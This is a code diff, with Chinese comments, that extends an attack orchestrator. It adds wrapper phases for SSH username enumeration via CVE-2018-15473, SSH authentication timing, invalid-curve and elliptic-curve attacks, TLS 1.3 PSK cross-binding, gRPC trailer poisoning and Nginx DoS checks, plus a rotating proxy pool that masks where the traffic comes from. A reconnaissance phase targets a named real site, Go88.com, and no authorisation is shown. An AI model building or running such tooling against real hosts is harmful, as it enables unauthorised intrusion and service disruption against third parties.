@@ -172,6 +172,62 @@ def safe_import(module_name: str):
 
 # -------- Adapters for each module --------
 
+# ========== 增强的代理池管理 ==========
+class ProxyPoolManager:
+    """统一的代理池管理器，支持并发和故障转移"""
+    
+    def __init__(self, proxy_urls: List[str] = None):
+        self.proxy_urls = proxy_urls or []
+        self.current_index = 0
+        self.lock = asyncio.Lock()
+        self.failed_proxies = set()
+        
+    async def get_proxy(self) -> Optional[str]:
+        """获取下一个可用代理"""
+        async with self.lock:
+            if not self.proxy_urls:
+                return None
+            
+            # 跳过失败的代理
+            attempts = 0
+            while attempts < len(self.proxy_urls):
+                proxy = self.proxy_urls[self.current_index]
+                self.current_index = (self.current_index + 1) % len(self.proxy_urls)
+                
+                if proxy not in self.failed_proxies:
+                    return proxy
+                attempts += 1
+            
+            # 如果所有代理都失败，重置失败列表重试
+            if self.failed_proxies:
+                logger.warning("All proxies failed, resetting failed list")
+                self.failed_proxies.clear()
+                return self.proxy_urls[0] if self.proxy_urls else None
+            
+            return None
+    
+    def mark_failed(self, proxy: str):
+        """标记代理为失败"""
+        self.failed_proxies.add(proxy)
+        logger.warning(f"Marked proxy as failed: {proxy[:30]}...")
+
+# 全局代理池实例
+_global_proxy_pool: Optional[ProxyPoolManager] = None
+
+def init_proxy_pool(proxy_urls: List[str]):
+    """初始化全局代理池"""
+    global _global_proxy_pool
+    _global_proxy_pool = ProxyPoolManager(proxy_urls)
+    logger.info(f"Initialized proxy pool with {len(proxy_urls)} proxies")
+
+async def get_pooled_proxy() -> Optional[str]:
+    """从代理池获取代理"""
+    if _global_proxy_pool:
+        return await _global_proxy_pool.get_proxy()
+    return None
+
+# ========== 增强的方法集成 ==========
+
 async def phase_smart_detect(host: str, ports: List[int]) -> PhaseResult:
     phase = "smart_detection"
     mod = safe_import('smart_detector')
@@ -691,6 +747,247 @@ async def phase_cve_2017_7529(host: str, web_port: int, timeout: float, target_d
     return await run_with_timeout(_run(), timeout, phase)
 
 
+# ========== 新增：proto_norm_diff 完整方法集成 ==========
+
+async def phase_proto_norm_export_evidence(host: str, tls_port: int, timeout: float, out_dir: str, proxy_url: Optional[str] = None) -> PhaseResult:
+    """导出proto_norm_diff的证据文件"""
+    phase = "proto_norm_export_evidence"
+    mod = safe_import('proto_norm_diff')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        effective_proxy = proxy_url or await get_pooled_proxy()
+        tool = mod._DeprecatedProtoNormDiff(host, tls_port, timeout=timeout, proxy_url=effective_proxy)
+        
+        # 先运行分析
+        await tool.run_matrix()
+        
+        # 导出证据
+        tool.export_evidence(out_dir)
+        
+        return {"exported": True, "out_dir": out_dir, "files_created": ["heatmap.csv", "evidence.json"]}
+    
+    return await run_with_timeout(_run(), timeout * 2, phase)
+
+async def phase_proto_norm_v2_analyze(host: str, tls_port: int, timeout: float, dimensions: Optional[List[str]] = None) -> PhaseResult:
+    """proto_norm_diff_v2 增强分析（包含状态图）"""
+    phase = "proto_norm_v2_analyze"
+    mod = safe_import('proto_norm_diff_v2')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        tool = mod.ProtoNormDiffV2(host, tls_port, timeout=timeout)
+        return await tool.analyze(dimensions=dimensions)
+    
+    return await run_with_timeout(_run(), timeout * 3, phase)
+
+# ========== 新增：nginx_dos_analyzer 完整方法集成 ==========
+
+async def phase_nginx_config_traps(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """检测Nginx配置陷阱"""
+    phase = "nginx_config_traps"
+    mod = safe_import('nginx_dos_analyzer')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = proxy_url
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        analyzer = mod.NginxDoSAnalyzer(host, web_port, timeout=timeout)
+        return await analyzer.detect_config_traps()
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+# ========== 新增：time_mch 完整方法集成 ==========
+
+async def phase_cve_2018_15473_enum(host: str, port: int, userlist: List[str], timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
+    """CVE-2018-15473 SSH用户枚举"""
+    phase = "cve_2018_15473_enum"
+    mod = safe_import('time_mch')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = proxy_url
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        return await mod.cve_2018_15473_enum(host, port, userlist, timeout=timeout)
+    
+    return await run_with_timeout(_run(), timeout * len(userlist), phase)
+
+async def phase_ssh_auth_timing(host: str, port: int, username: str, password: str, timeout: float = 5.0, proxy_url: Optional[str] = None) -> PhaseResult:
+    """SSH认证时间测量"""
+    phase = "ssh_auth_timing"
+    mod = safe_import('time_mch')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = proxy_url
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        return await mod.ssh_auth_timing(host, port, username, password, timeout=timeout)
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+# ========== 新增：p256_elliptic 完整方法集成 ==========
+
+async def phase_p256_invalid_curve_attack(host: str, tls_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """P-256椭圆曲线非法曲线攻击"""
+    phase = "p256_invalid_curve"
+    mod = safe_import('p256_elliptic')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        probe_factory = mod.ECProbeFactory()
+        attacker = mod.InvalidCurveAttacker(host, probe_factory)
+        results = await attacker.run_attack()
+        
+        return {
+            "vulnerable": any(r.success for r in results),
+            "results": [r.__dict__ for r in results],
+            "risk_level": "HIGH" if any(r.success for r in results) else "LOW"
+        }
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+# ========== 新增：wasm_runtime_analyzer 完整方法集成 ==========
+
+async def phase_wasm_detect_runtime(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """检测WASM运行时环境"""
+    phase = "wasm_detect_runtime"
+    mod = safe_import('wasm_runtime_analyzer')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
+        return await analyzer._detect_wasm_runtime()
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+async def phase_wasm_timing_patterns(host: str, web_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """通过时序模式检测WASM编译缓存"""
+    phase = "wasm_timing_patterns"
+    mod = safe_import('wasm_runtime_analyzer')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        analyzer = mod.WasmRuntimeAnalyzer(host, web_port, timeout=timeout)
+        return await analyzer._detect_via_timing_patterns()
+    
+    return await run_with_timeout(_run(), timeout * 2, phase)
+
+# ========== 新增：xds_protocol_analyzer 完整方法集成 ==========
+
+async def phase_xds_discover_services(host: str, xds_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """发现xDS服务和端点"""
+    phase = "xds_discover_services"
+    mod = safe_import('xds_protocol_analyzer')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        analyzer = mod.XDSProtocolAnalyzer(host, xds_port, timeout=timeout)
+        return await analyzer._discover_xds_services()
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+async def phase_xds_test_grpc_connection(host: str, port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """测试gRPC xDS连接"""
+    phase = "xds_test_grpc_connection"
+    mod = safe_import('xds_protocol_analyzer')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    async def _run():
+        analyzer = mod.XDSProtocolAnalyzer(host, port, timeout=timeout)
+        return await analyzer._test_grpc_xds_connection(port)
+    
+    return await run_with_timeout(_run(), timeout, phase)
+
+# ========== 新增：grpc_trailer_poisoning 完整方法集成 ==========
+
+async def phase_grpc_comprehensive_assessment(host: str, grpc_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
+    """GRPC全面安全评估"""
+    phase = "grpc_comprehensive_assessment"
+    mod = safe_import('grpc_trailer_poisoning')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        effective_proxy = proxy_url or await get_pooled_proxy()
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = effective_proxy
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        attacker = mod.GrpcTrailerPoisoning(host, grpc_port, timeout=timeout)
+        return await attacker.run_comprehensive_assessment()
+    
+    return await run_with_timeout(_run(), timeout * 2, phase)
+
+# ========== 新增：tls13_psk_crossbind 完整方法集成 ==========
+
+async def phase_tls13_psk_full_attack(host: str, tls_port: int, timeout: float, sni_list: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
+    """TLS 1.3 PSK跨绑定完整攻击"""
+    phase = "tls13_psk_full_attack"
+    mod = safe_import('tls13_psk_crossbind')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        effective_proxy = proxy_url or await get_pooled_proxy()
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = effective_proxy
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        attacker = mod.TLS13PSKCrossBind(host, tls_port, timeout=timeout)
+        snis = sni_list or [host]
+        return await attacker.run_psk_crossbind_attack(snis)
+    
+    return await run_with_timeout(_run(), timeout * 2, phase)
+
+# ========== 新增：ec_aoe 完整方法集成 ==========
+
+async def phase_ec_aoe_full_attack(host: str, tls_port: int, timeout: float, protocols: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
+    """椭圆曲线AOE完整攻击"""
+    phase = "ec_aoe_full_attack"
+    mod = safe_import('ec_aoe')
+    if isinstance(mod, Exception):
+        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
+    
+    # 设置代理
+    if proxy_url:
+        effective_proxy = proxy_url or await get_pooled_proxy()
+        if hasattr(mod, 'PROXY_URL'):
+            mod.PROXY_URL = effective_proxy
+            mod.PROXY_ENABLED = True
+    
+    async def _run():
+        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
+        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
+        return await attacker.run_comprehensive_attack(protos)
+    
+    return await run_with_timeout(_run(), timeout * 3, phase)  # EC攻击需要更多时间
+
 async def phase_go88_recon(host: str, timeout: float) -> PhaseResult:
     """Go88.com targeted reconnaissance"""
     phase = "go88_recon"
@@ -750,10 +1047,20 @@ class IntegratedOrchestrator:
                  jsonl_file: Optional[str] = None,
                  log_file: Optional[str] = None,
                  proxy_url: Optional[str] = None,
-                 force_proxy: bool = True):
+                 force_proxy: bool = True,
+                 proxy_pool: Optional[List[str]] = None):
         
         # 简单的配置验证 - 快速失败
         self._validate_basic_config(host, tls_port, http_port, timeout)
+        
+        # 初始化代理池
+        if proxy_pool:
+            init_proxy_pool(proxy_pool)
+            logger.info(f"Initialized proxy pool with {len(proxy_pool)} proxies")
+        elif proxy_url:
+            # 如果只有单个代理，也创建一个池
+            init_proxy_pool([proxy_url])
+            logger.info(f"Initialized proxy pool with single proxy")
         self.host = host
         self.ip = ip
         # 使用IP地址进行连接，但保留hostname用于SNI/Host header
@@ -770,10 +1077,24 @@ class IntegratedOrchestrator:
         self.proxy_url = proxy_url
         self.force_proxy = force_proxy
         self.enable_phases = set(enable_phases or [
-            'smart_detection', 'fingerprint', 'certificate_attacks', 'ocsp_validation', 'xds_analysis',
-            'wasm_runtime', 'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning',
-            'tls13_psk_crossbind', 'elliptic_curve_aoe', 'nginx_dos_sandwich', 'time_mch_first_door',
-            'proto_norm_diff', 'cve_2017_7529', 'go88_recon'
+            # 基础侦察
+            'smart_detection', 'fingerprint',
+            # 证书和OCSP
+            'certificate_attacks', 'ocsp_validation',
+            # HTTP/2和gRPC
+            'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning',
+            # xDS和WASM
+            'xds_analysis', 'wasm_runtime',
+            # TLS和椭圆曲线
+            'tls13_psk_crossbind', 'elliptic_curve_aoe',
+            # Nginx
+            'nginx_dos_sandwich', 'nginx_config_traps',
+            # SSH
+            'time_mch_first_door',
+            # 协议规范化差异
+            'proto_norm_diff', 'proto_norm_v2_analyze',
+            # 其他
+            'cve_2017_7529', 'go88_recon'
         ])
         self.jsonl_file = jsonl_file
         self.logger = self._setup_logger(log_file)
@@ -885,12 +1206,22 @@ class IntegratedOrchestrator:
             raise ValueError(f"Config errors: {'; '.join(errors)}")
 
     def _plan_parallel_groups(self) -> Dict[str, List[str]]:
-        """简单的并行组规划"""
+        """简单的并行组规划 - 增强版"""
         return {
             'foundation': ['smart_detection'],
             'fingerprint': ['fingerprint'], 
-            'independent': ['certificate_attacks', 'ocsp_validation', 'xds_analysis', 'wasm_runtime', 'proto_norm_diff'],
-            'protocol': ['h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning', 'tls13_psk_crossbind']
+            'independent': [
+                'certificate_attacks', 'ocsp_validation', 'xds_analysis', 'wasm_runtime', 
+                'proto_norm_diff', 'proto_norm_v2_analyze', 'nginx_config_traps',
+                'wasm_detect_runtime', 'wasm_timing_patterns', 'xds_discover_services'
+            ],
+            'protocol': [
+                'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning', 
+                'tls13_psk_crossbind', 'grpc_comprehensive_assessment', 'tls13_psk_full_attack'
+            ],
+            'elliptic': ['elliptic_curve_aoe', 'ec_aoe_full_attack', 'p256_invalid_curve'],
+            'ssh': ['time_mch_first_door', 'cve_2018_15473_enum', 'ssh_auth_timing'],
+            'export': ['proto_norm_export_evidence']
         }
 
     def _emit_jsonl(self, event: Dict[str, Any]) -> None:
@@ -1102,9 +1433,17 @@ class IntegratedOrchestrator:
             parallel_tasks.append(asyncio.create_task(
                 self._run_phase_with_events(phase_nginx_dos, 'nginx_dos_sandwich', self.host, self.http_port, self.timeout)
             ))
+        if 'nginx_config_traps' in next_phases:
+            parallel_tasks.append(asyncio.create_task(
+                self._run_phase_with_events(phase_nginx_config_traps, 'nginx_config_traps', self.host, self.http_port, self.timeout, self.proxy_url)
+            ))
         if 'elliptic_curve_aoe' in next_phases:
             parallel_tasks.append(asyncio.create_task(
                 self._run_phase_with_events(phase_ec_aoe, 'elliptic_curve_aoe', self.host, self.tls_port, self.timeout, self.ec_protocols, self.proxy_url)
+            ))
+        if 'p256_invalid_curve' in next_phases:
+            parallel_tasks.append(asyncio.create_task(
+                self._run_phase_with_events(phase_p256_invalid_curve_attack, 'p256_invalid_curve', self.host, self.tls_port, self.timeout, self.proxy_url)
             ))
         if 'time_mch_first_door' in next_phases:
             parallel_tasks.append(asyncio.create_task(
@@ -1113,6 +1452,18 @@ class IntegratedOrchestrator:
         if 'proto_norm_diff' in next_phases:
             parallel_tasks.append(asyncio.create_task(
                 self._run_phase_with_events(phase_proto_norm_diff, 'proto_norm_diff', self.host, self.tls_port, self.timeout, survey_only=False, proxy_url=self.proxy_url)
+            ))
+        if 'proto_norm_v2_analyze' in next_phases:
+            parallel_tasks.append(asyncio.create_task(
+                self._run_phase_with_events(phase_proto_norm_v2_analyze, 'proto_norm_v2_analyze', self.host, self.tls_port, self.timeout, None)
+            ))
+        if 'wasm_detect_runtime' in next_phases:
+            parallel_tasks.append(asyncio.create_task(
+                self._run_phase_with_events(phase_wasm_detect_runtime, 'wasm_detect_runtime', self.host, self.http_port, self.timeout, self.proxy_url)
+            ))
+        if 'xds_discover_services' in next_phases:
+            parallel_tasks.append(asyncio.create_task(
+                self._run_phase_with_events(phase_xds_discover_services, 'xds_discover_services', self.host, self.xds_port, self.timeout, self.proxy_url)
             ))
 
         # HTTP/2相关攻击模块
